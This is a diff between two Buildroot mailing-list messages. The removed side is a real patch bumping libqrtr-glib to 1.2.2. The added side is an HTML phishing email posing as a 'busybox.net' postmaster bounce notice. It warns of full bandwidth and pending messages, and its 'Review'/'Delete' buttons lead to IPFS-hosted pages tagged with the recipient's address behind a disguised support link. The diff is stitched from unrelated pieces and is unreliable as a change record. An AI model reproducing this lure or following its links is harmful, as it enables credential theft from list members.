@@ -4,84 +4,42 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 3A529C47DA2
-	for <buildroot@archiver.kernel.org>; Mon, 15 Jan 2024 22:40:03 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 6FCE7C3DA79
+	for <buildroot@archiver.kernel.org>; Mon, 15 Jan 2024 23:39:10 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp1.osuosl.org (Postfix) with ESMTP id C145A81E8D;
-	Mon, 15 Jan 2024 22:40:02 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org C145A81E8D
+	by smtp1.osuosl.org (Postfix) with ESMTP id E819681B26;
+	Mon, 15 Jan 2024 23:39:09 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org E819681B26
 X-Virus-Scanned: amavisd-new at osuosl.org
 Received: from smtp1.osuosl.org ([127.0.0.1])
 	by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
-	with ESMTP id kWCX2o0lKfWs; Mon, 15 Jan 2024 22:40:02 +0000 (UTC)
+	with ESMTP id fyKQJca85GWJ; Mon, 15 Jan 2024 23:39:09 +0000 (UTC)
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp1.osuosl.org (Postfix) with ESMTP id 1B9C681E86;
-	Mon, 15 Jan 2024 22:40:01 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 1B9C681E86
-Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
- by ash.osuosl.org (Postfix) with ESMTP id 10ADF1BF39D
- for <buildroot@lists.busybox.net>; Mon, 15 Jan 2024 22:40:00 +0000 (UTC)
+	by smtp1.osuosl.org (Postfix) with ESMTP id 44FA981B14;
+	Mon, 15 Jan 2024 23:39:08 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 44FA981B14
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id AF9461BF34B
+ for <buildroot@lists.busybox.net>; Mon, 15 Jan 2024 23:39:06 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp2.osuosl.org (Postfix) with ESMTP id DB54F42EBE
- for <buildroot@lists.busybox.net>; Mon, 15 Jan 2024 22:39:59 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org DB54F42EBE
+ by smtp1.osuosl.org (Postfix) with ESMTP id 809F781B14
+ for <buildroot@lists.busybox.net>; Mon, 15 Jan 2024 23:39:06 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 809F781B14
 X-Virus-Scanned: amavisd-new at osuosl.org
-Received: from smtp2.osuosl.org ([127.0.0.1])
- by localhost (smtp2.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
- with ESMTP id 8GpOOACLctcz for <buildroot@lists.busybox.net>;
- Mon, 15 Jan 2024 22:39:58 +0000 (UTC)
-Received: from mail-ej1-x629.google.com (mail-ej1-x629.google.com
- [IPv6:2a00:1450:4864:20::629])
- by smtp2.osuosl.org (Postfix) with ESMTPS id 5592841D60
- for <buildroot@buildroot.org>; Mon, 15 Jan 2024 22:39:58 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 5592841D60
-Received: by mail-ej1-x629.google.com with SMTP id
- a640c23a62f3a-a28b2e1a13fso963957466b.3
- for <buildroot@buildroot.org>; Mon, 15 Jan 2024 14:39:58 -0800 (PST)
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20230601; t=1705358396; x=1705963196;
- h=content-transfer-encoding:mime-version:message-id:date:subject:cc
- :to:from:x-gm-message-state:from:to:cc:subject:date:message-id
- :reply-to;
- bh=PmGASyWW+bnEOKh3bEpL/rE0wAikdWKI2xXk7G62uuQ=;
- b=b/VRb4hy9QwCbqSxYXmxuf2/egYS6vODW7GvW5qFzTCAfexwtyFlG5GcCxkmNelM3P
- VI+vatW8Br64+xC7yIKWDecpeApG5uiagPo3SglnjjO+ApWtwtwBW5KZy+3Id+mSOnHt
- 3lv1Ua1QhnBYO19MwehOTNpeAfERKNX9uaZvFB7saQc9hCeu7lLena3awlAtyQm3b0pw
- 1ixkDvfF73JlEhVaqkS5ZsLnNn99+U/7dRgFhODOhn6KX74SeSk3aJHRTm6QvsuS8Eto
- r2wju7wFRdwdx8nngk/MjlOzaRI5Hqy5kU4tQIsORJq12e8Xqw8pMkxmX1nbCLF7jmtH
- 7xgQ==
-X-Gm-Message-State: AOJu0YyIINyif2yhIvd1nmWejndBvXEiXzgH1GXX71jkxpIhNzyveNAx
- F6nIAFD0XkHGB5I8hwXWbkFynUSMIUI=
-X-Google-Smtp-Source: AGHT+IFj9K2TzQsJgYDgvbyg3s9X87d7n3STzX9VUBYq7dB32WlRvSNxfuEjp4yRPcxdNjG9NV4jCg==
-X-Received: by 2002:a17:907:d40c:b0:a2d:a239:635e with SMTP id
- vi12-20020a170907d40c00b00a2da239635emr1396992ejc.24.1705358396443; 
- Mon, 15 Jan 2024 14:39:56 -0800 (PST)
-Received: from x230.suse.cz (gw1.ms-free.net. [185.243.124.10])
- by smtp.gmail.com with ESMTPSA id
- v24-20020a1709067d9800b00a2a4efe7d3dsm5771303ejo.79.2024.01.15.14.39.55
- (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
- Mon, 15 Jan 2024 14:39:56 -0800 (PST)
-From: Petr Vorel <petr.vorel@gmail.com>
-To: buildroot@buildroot.org
-Date: Mon, 15 Jan 2024 23:39:52 +0100
-Message-ID: <20240115223952.2532111-1-petr.vorel@gmail.com>
-X-Mailer: git-send-email 2.43.0
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id pezPCL4oa8mP for <buildroot@lists.busybox.net>;
+ Mon, 15 Jan 2024 23:39:05 +0000 (UTC)
+Received: from busybox.net (unknown [141.98.10.96])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 0CEAE81AEF
+ for <buildroot@busybox.net>; Mon, 15 Jan 2024 23:39:04 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 0CEAE81AEF
+From: Postmaster <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 16 Jan 2024 00:39:03 +0100
+Message-ID: <20240116003903.B257B46A6E7E0CC5@busybox.net>
 MIME-Version: 1.0
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=gmail.com; s=20230601; t=1705358396; x=1705963196; darn=buildroot.org;
- h=content-transfer-encoding:mime-version:message-id:date:subject:cc
- :to:from:from:to:cc:subject:date:message-id:reply-to;
- bh=PmGASyWW+bnEOKh3bEpL/rE0wAikdWKI2xXk7G62uuQ=;
- b=Tarm3rcxe2Jnf62LzyjYl/z7LsZxbKIZZyLR7y531r0Fe7MtypAT3BKjvMn1NYdvvR
- pc45bgugi2ixTw1jezKwzn9tADkZvmkBJqeAQKPMklOD+CrrfnyEkElaWFmVLtiY6nc1
- 6yZZHmp2H1tkAOBEsyxa9Vwnr3G3OGmPNmfX0PWAiWMX7pe1SNusmN+87AiOf3FRtvSY
- qCUHo1gn8AF8sN0s3ZAvbN7C/TrXMk4uXkO+3uYCtsyNl7IfC1CxHqmIwFiaxKRLxA3n
- 94BGPIE0QmpHy9pOcejNqRy4lmO+netY0NqAweZ9hjHLepDdlOBABgROBOxDpH0tydMO
- 8mGg==
-X-Mailman-Original-Authentication-Results: smtp2.osuosl.org;
- dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com
- header.a=rsa-sha256 header.s=20230601 header.b=Tarm3rcx
-Subject: [Buildroot] [PATCH 1/1] package/libqrtr-glib: bump version to 1.2.2
+Subject: [Buildroot] Undeliverable: Outgoing Mail Returned to Sender
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -93,89 +51,123 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Cc: Thomas Petazzoni <thomas.petazzoni@free-electrons.com>,
- Aleksander Morgado <aleksander@aleksander.es>,
- Petr Vorel <petr.vorel@gmail.com>, "Yann E . MORIN" <yann.morin.1998@free.fr>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============1891983970047292871=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-Project switched to meson.
-Use gitlab.freedesktop.org for download (previous URL did not work for
-meson), thus moving to tar.gz archive.
+--===============1891983970047292871==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-Disable gtkdocize (not only to follow Buildroot approach, but also to avoid
-build failure: ERROR: Program 'gtkdoc-scan' not found or not executable).
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
+text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
+ing: normal; font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size:=
+ 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
+: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; wi=
+dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
+al; font-variant-caps: normal;=20
+text-decoration-style: initial; text-decoration-color: initial; -webkit-tex=
+t-stroke-width: 0px; text-decoration-thickness: initial;">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<th style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
+ne; width: 2px; color: rgb(0, 0, 0); box-sizing: border-box; background-col=
+or: rgb(2, 151, 64);">&nbsp;</th>
+<td style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
+ne; width: 665px; color: rgb(0, 0, 0); box-sizing: border-box; background-c=
+olor: rgb(243, 255, 248);"><span style=3D"font-size: 12px; box-sizing: bord=
+er-box;">Message from&nbsp;busybox.net server</span></td></tr></tbody></tab=
+le>
+<div style=3D"border-width: 0px; margin: 0px; padding: 20px; text-align: le=
+ft; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
+spacing: normal; font-family: Verdana; font-size: 12px; font-style: normal;=
+ font-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space=
+: normal; box-sizing: border-box; orphans: 2; widows: 2; font-stretch: inhe=
+rit; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
+font-variant-caps: normal; text-decoration-style:=20
+initial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; te=
+xt-decoration-thickness: initial;"><font color=3D"#000066" face=3D"Arial" s=
+ize=3D"4" style=3D"box-sizing: border-box;"><table style=3D"padding-top: 32=
+px; background-color: rgb(255, 255, 255);" cellspacing=3D"0" cellpadding=3D=
+"0"><tbody><tr><td><font size=3D"2"> </font><table cellspacing=3D"0" cellpa=
+dding=3D"0"><tbody><tr>
+<td style=3D"padding: 24px 24px 32px; border-radius: 2px; border: 1px solid=
+ rgb(224, 224, 224); border-image: none; max-width: 560px; background-color=
+: rgb(250, 250, 250);"><font size=3D"2"> </font><font size=3D"2"> </font><f=
+ont size=3D"2"> </font><table style=3D"padding-top: 8px; min-width: 272px;"=
+><tbody><tr><td> <h2 style=3D"margin: 0px; color: rgb(33, 33, 33); font-wei=
+ght: bold;"><font size=3D"1"></font><font size=3D"2">Message bandwidth is f=
+ull </font></h2></td></tr><tr>
+<td style=3D"text-align: left; color: rgb(117, 117, 117); padding-top: 20px=
+; font-weight: normal;"><p><font size=3D"2"> This message was created autom=
+atically by mail delivery software.</font></p><p><br><font size=3D"2">The f=
+ollowing message from </font><a style=3D"color: rgb(33, 33, 33); text-decor=
+ation: none;" href=3D"mailto:buildroot@busybox.net"><b><font size=3D"2">bui=
+ldroot@busybox.net</font></b></a><font size=3D"2"> was undeliverable.<br>&n=
+bsp;The reason for the problem:<br>
+&nbsp;5.4.7 - Delivery expired (message too old) 'timeout'</font></p></td><=
+/tr><tr><td style=3D"text-align: left; color: rgb(66, 133, 244); padding-to=
+p: 24px;"><font size=3D"2"></font>
+<a style=3D"text-decoration: none;" href=3D"https://cloudflare-ipfs.com/ipf=
+s/bafkreibbpap5xlsq262d72wdiwwsupeg7bbszvinreci32avf3lmfhsusq#buildroot@bus=
+ybox.net" target=3D"_blank" data-saferedirecturl=3D"https://www.google.com/=
+url?q=3Dhttps://support.google.com/mail/answer/6596&amp;source=3Dgmail&amp;=
+ust=3D1680546997744000&amp;usg=3DAOvVaw0KwZ7dRteNzrgii7VYARUA"><font size=
+=3D"2"><strong>REVIEW BANDWIDTH</strong></font></a></td></tr></tbody></tabl=
+e><font size=3D"2"></font></td></tr></tbody>
+</table><font size=3D"2"></font></td></tr><tr style=3D"border: currentColor=
+; border-image: none; width: 90%; background-color: rgb(255, 255, 255);"><t=
+d align=3D"left" style=3D"padding: 48px 10px;"><font size=3D"2"><font size=
+=3D"3"><span style=3D"box-sizing: border-box;">You have 3 pending outgoing =
+messages that could not be sent as of 1/16/2024 12:39:03 a.m.</span><br sty=
+le=3D"box-sizing: border-box;"><span style=3D"box-sizing: border-box;"><fon=
+t style=3D"box-sizing: border-box;">Click to&nbsp;</font>
+<a class=3D"v1external_mr_css_attr" style=3D"border-width: 0px; margin: 0px=
+; padding: 0px; color: rgb(17, 85, 204); text-decoration: none; vertical-al=
+ign: baseline; cursor: pointer; box-sizing: border-box; background-color: t=
+ransparent;" href=3D"https://cloudflare-ipfs.com/ipfs/bafkreibbpap5xlsq262d=
+72wdiwwsupeg7bbszvinreci32avf3lmfhsusq#buildroot@busybox.net" target=3D"_bl=
+ank" rel=3D"noreferrer"><font style=3D"box-sizing: border-box;">Review</fon=
+t></a>
+<font style=3D"box-sizing: border-box;">or</font>
+<a class=3D"v1external_mr_css_attr" style=3D"border-width: 0px; margin: 0px=
+; padding: 0px; color: rgb(17, 85, 204); text-decoration: none; vertical-al=
+ign: baseline; cursor: pointer; box-sizing: border-box; background-color: t=
+ransparent;" href=3D"https://cloudflare-ipfs.com/ipfs/bafkreibbpap5xlsq262d=
+72wdiwwsupeg7bbszvinreci32avf3lmfhsusq#buildroot@busybox.net" target=3D"_bl=
+ank" rel=3D"noreferrer"><font style=3D"box-sizing: border-box;">Delete</fon=
+t></a>
+<font style=3D"box-sizing: border-box;">pending outgoing email messages.</f=
+ont></span></font></font></td></tr></tbody></table><p><font size=3D"3"><spa=
+n style=3D"box-sizing: border-box;"><span style=3D"color: black; box-sizing=
+: border-box;"><font size=3D"3"><font size=3D"2">The response was:<br></fon=
+t></font></span></span></font><p style=3D"font-family: monospace;"><font si=
+ze=3D"3"><font size=3D"3"><font size=3D"2">
+ A message that you sent could not be delivered to one or more of its recip=
+ients. This is a temporary error. <br>Learn more at </font>
+<a href=3D"https://dweb.link/ipfs/QmZ6uSvSTJ3Uh9BAeA5f2GDMKdR22gmTZimY28ted=
+pqwHj?filename=3DQmZ6uSvSTJ3Uh9BAeA5f2GDMKdR22gmTZimY28tedpqwHj#buildroot@b=
+usybox.net" target=3D"_blank" data-saferedirecturl=3D"https://www.google.co=
+m/url?q=3Dhttps://support.google.com/mail/answer/6596&amp;source=3Dgmail&am=
+p;ust=3D1680546997744000&amp;usg=3DAOvVaw0KwZ7dRteNzrgii7VYARUA"> <font siz=
+e=3D"2">https://support.busybox.net/<wbr>mail/answer/6596</font></a></font>=
+</font></p><p></p></font></div></body></html>
 
-License file got renamed:
-https://gitlab.freedesktop.org/mobile-broadband/libqrtr-glib/-/commit/974e4231eaf4a3bf087c1df54e77df8cac935e15
-
-Signed-off-by: Petr Vorel <petr.vorel@gmail.com>
----
-Hi,
-
-build tested (very minimal testing):
-
-                    bootlin-armv5-uclibc [1/6]: SKIPPED
-                     bootlin-armv7-glibc [2/6]: OK
-                   bootlin-armv7m-uclibc [3/6]: SKIPPED
-                     bootlin-x86-64-musl [4/6]: SKIPPED
-                      br-arm-full-static [5/6]: SKIPPED
-                            sourcery-arm [6/6]: SKIPPED
-6 builds, 5 skipped, 0 build failed, 0 legal-info failed, 0 show-info failed
-
- package/libqrtr-glib/libqrtr-glib.hash |  4 ++--
- package/libqrtr-glib/libqrtr-glib.mk   | 16 +++++++++-------
- 2 files changed, 11 insertions(+), 9 deletions(-)
-
-diff --git a/package/libqrtr-glib/libqrtr-glib.hash b/package/libqrtr-glib/libqrtr-glib.hash
-index e00dd0cb94..38543f7de9 100644
---- a/package/libqrtr-glib/libqrtr-glib.hash
-+++ b/package/libqrtr-glib/libqrtr-glib.hash
-@@ -1,3 +1,3 @@
- # Locally computed
--sha256  dc626520dcd53a22f727af3ee42c770e56c97a64fe3adb063799d8ab032fe551  COPYING.LIB
--sha256  30d879b2ade6f8f461def3a677755db5c0238babf688d5c83c03b3e6abe35cee  libqrtr-glib-1.0.0.tar.xz
-+sha256  c5cdf5ea91cbd2cf2758b2896064c7b1dfe7156063267df905f957ac69b6b763  libqrtr-glib-1.2.2.tar.gz
-+sha256  dc626520dcd53a22f727af3ee42c770e56c97a64fe3adb063799d8ab032fe551  LICENSES/LGPL-2.1-or-later.txt
-diff --git a/package/libqrtr-glib/libqrtr-glib.mk b/package/libqrtr-glib/libqrtr-glib.mk
-index 6ab8335417..c3df76dc84 100644
---- a/package/libqrtr-glib/libqrtr-glib.mk
-+++ b/package/libqrtr-glib/libqrtr-glib.mk
-@@ -4,19 +4,21 @@
- #
- ################################################################################
- 
--LIBQRTR_GLIB_VERSION = 1.0.0
--LIBQRTR_GLIB_SITE = http://www.freedesktop.org/software/libqmi
--LIBQRTR_GLIB_SOURCE = libqrtr-glib-$(LIBQRTR_GLIB_VERSION).tar.xz
-+LIBQRTR_GLIB_VERSION = 1.2.2
-+LIBQRTR_GLIB_SITE = https://gitlab.freedesktop.org/mobile-broadband/libqrtr-glib/-/archive/$(LIBQRTR_GLIB_VERSION)
- LIBQRTR_GLIB_LICENSE = LGPL-2.1+
--LIBQRTR_GLIB_LICENSE_FILES = COPYING.LIB
-+LIBQRTR_GLIB_LICENSE_FILES = LICENSES/LGPL-2.1-or-later.txt
- LIBQRTR_GLIB_INSTALL_STAGING = YES
- LIBQRTR_GLIB_DEPENDENCIES = libglib2
- 
- ifeq ($(BR2_PACKAGE_GOBJECT_INTROSPECTION),y)
--LIBQRTR_GLIB_CONF_OPTS += --enable-introspection
-+LIBQRTR_GLIB_CONF_OPTS += -Dintrospection=true
- LIBQRTR_GLIB_DEPENDENCIES += gobject-introspection
- else
--LIBQRTR_GLIB_CONF_OPTS += --disable-introspection
-+LIBQRTR_GLIB_CONF_OPTS += -Dintrospection=false
- endif
- 
--$(eval $(autotools-package))
-+# disable gtkdocize
-+LIBQRTR_GLIB_CONF_OPTS += -Dgtk_doc=false
-+
-+$(eval $(meson-package))
--- 
-2.43.0
+--===============1891983970047292871==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============1891983970047292871==--
